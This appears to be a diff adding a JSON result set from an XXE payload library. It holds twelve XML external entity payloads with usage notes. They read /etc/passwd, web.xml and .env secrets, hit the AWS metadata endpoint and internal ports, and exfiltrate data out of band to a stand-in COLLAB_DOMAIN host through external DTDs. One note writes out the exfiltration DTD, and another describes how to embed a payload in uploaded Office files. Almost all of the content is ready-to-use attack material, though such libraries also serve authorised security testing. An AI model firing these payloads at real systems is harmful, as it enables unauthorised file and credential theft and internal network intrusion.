@@ -1,0 +1,237 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "xxe"
+  },
+  "count": 12,
+  "results": [
+    {
+      "id": "4f634144b036d894",
+      "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"http://COLLAB_DOMAIN/xxe\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
+      "technique": "xxe_ssrf",
+      "injection_surface": "xml_body",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 2,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "XXE SSRF to external domain for OOB confirmation.",
+      "source": "ensphere",
+      "tags": [
+        "confirmation",
+        "dns",
+        "oob",
+        "ssrf"
+      ]
+    },
+    {
+      "id": "09c6c20cb9613897",
+      "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"http://COLLAB_DOMAIN/atom-xxe\"\u003e]\u003e\u003cfeed xmlns=\"http://www.w3.org/2005/Atom\"\u003e\u003ctitle\u003e\u0026xxe;\u003c/title\u003e\u003centry\u003e\u003ctitle\u003eTest\u003c/title\u003e\u003cid\u003eurn:uuid:1\u003c/id\u003e\u003cupdated\u003e2024-01-01T00:00:00Z\u003c/updated\u003e\u003c/entry\u003e\u003c/feed\u003e",
+      "technique": "xxe_ssrf",
+      "injection_surface": "xml_body",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "XXE via Atom feed. Check for OOB DNS hit when feed URL is submitted for parsing.",
+      "source": "ensphere",
+      "tags": [
+        "atom",
+        "feed",
+        "oob",
+        "ssrf"
+      ]
+    },
+    {
+      "id": "0d4feea7b1a1069e",
+      "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
+      "technique": "xxe_ssrf",
+      "injection_surface": "xml_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "XXE SSRF to AWS metadata endpoint.",
+      "source": "ensphere",
+      "tags": [
+        "aws",
+        "cloud",
+        "metadata",
+        "ssrf"
+      ]
+    },
+    {
+      "id": "0eaf262a48232eab",
+      "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY % ext SYSTEM \"http://COLLAB_DOMAIN/pe-only.dtd\"\u003e%ext;%exfil;]\u003e\u003cfoo\u003ebar\u003c/foo\u003e",
+      "technique": "xxe_oob",
+      "injection_surface": "xml_body",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "Parameter-entity-only OOB. No general entity in body — bypasses parsers that block \u0026xxe; in content but allow % entities in DTD. Host DTD: \u003c!ENTITY % data SYSTEM 'file:///etc/passwd'\u003e\u003c!ENTITY % exfil '\u003c!ENTITY \u0026#37; send SYSTEM \"http://COLLAB_DOMAIN/?d=%data;\"\u003e'\u003e%send;",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "oob",
+        "parameter_entity_only"
+      ]
+    },
+    {
+      "id": "48dad07f2011f3af",
+      "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY % pe SYSTEM \"http://COLLAB_DOMAIN/libxml2-xxe.dtd\"\u003e%pe;]\u003e\u003cfoo\u003ebar\u003c/foo\u003e",
+      "technique": "xxe_oob",
+      "injection_surface": "xml_body",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "Targets Python lxml/libxml2. Older lxml (\u003c4.6.5) and libxml2 with default settings resolve external entities. Use external DTD for exfiltration since libxml2 blocks inline parameter entity nesting.",
+      "source": "ensphere",
+      "tags": [
+        "library_specific",
+        "libxml2",
+        "lxml",
+        "oob",
+        "python"
+      ]
+    },
+    {
+      "id": "48ef99cc3a044207",
+      "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY % xxe SYSTEM \"http://COLLAB_DOMAIN/xxe.dtd\"\u003e%xxe;]\u003e\u003cfoo\u003ebar\u003c/foo\u003e",
+      "technique": "xxe_oob",
+      "injection_surface": "xml_body",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "OOB XXE via external DTD. Host a DTD that exfiltrates data.",
+      "source": "ensphere",
+      "tags": [
+        "blind",
+        "external_dtd",
+        "oob"
+      ]
+    },
+    {
+      "id": "5dcd4a0251d2da36",
+      "payload": "\u003c?xml version=\"1.0\"?\u003e\u003cxsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\u003e\u003cxsl:template match=\"/\"\u003e\u003cxsl:value-of select=\"document('http://COLLAB_DOMAIN/xslt-ssrf')\"/\u003e\u003c/xsl:template\u003e\u003c/xsl:stylesheet\u003e",
+      "technique": "xxe_ssrf",
+      "injection_surface": "xml_body",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "XSLT SSRF via document(). Confirm with OOB DNS callback.",
+      "source": "ensphere",
+      "tags": [
+        "oob",
+        "ssrf",
+        "xslt"
+      ]
+    },
+    {
+      "id": "5f76609ead82fde7",
+      "payload": "%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20foo%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E",
+      "technique": "xxe_file_read",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "URL-encoded XXE payload for query parameter.",
+      "source": "ensphere",
+      "tags": [
+        "file_read",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "6fab66ec595b7975",
+      "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"http://127.0.0.1:PORT/\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
+      "technique": "xxe_ssrf",
+      "injection_surface": "xml_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [
+        "PORT"
+      ],
+      "notes": "XXE SSRF to internal ports. Scan for open services.",
+      "source": "ensphere",
+      "tags": [
+        "internal",
+        "port_scan",
+        "ssrf"
+      ]
+    },
+    {
+      "id": "a2f5ba739ee110da",
+      "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY % dtd SYSTEM \"http://COLLAB_DOMAIN/ooxml-xxe.dtd\"\u003e%dtd;]\u003e\u003cTypes xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"\u003e\u003cDefault Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/\u003e\u003c/Types\u003e",
+      "technique": "xxe_oob",
+      "injection_surface": "file_upload",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "XXE in [Content_Types].xml — the first file parsed in any OOXML archive (XLSX, DOCX, PPTX). Blind OOB via external DTD. Unzip, replace [Content_Types].xml, repack.",
+      "source": "ensphere",
+      "tags": [
+        "blind",
+        "content_types",
+        "file_upload",
+        "oob",
+        "ooxml"
+      ]
+    },
+    {
+      "id": "ada42131d67072bd",
+      "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"file:///WEB-INF/web.xml\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
+      "technique": "xxe_file_read",
+      "injection_surface": "xml_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Java web.xml file read. Contains servlet mappings, security constraints, and context params.",
+      "source": "ensphere",
+      "tags": [
+        "file_read",
+        "java",
+        "web_inf",
+        "web_xml"
+      ]
+    },
+    {
+      "id": "c0b18b8a13889775",
+      "payload": "\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"file://.env\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e",
+      "technique": "xxe_file_read",
+      "injection_surface": "xml_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Read .env file via relative path.",
+      "source": "ensphere",
+      "tags": [
+        "dotenv",
+        "file_read",
+        "secrets"
+      ]
+    }
+  ]
+}
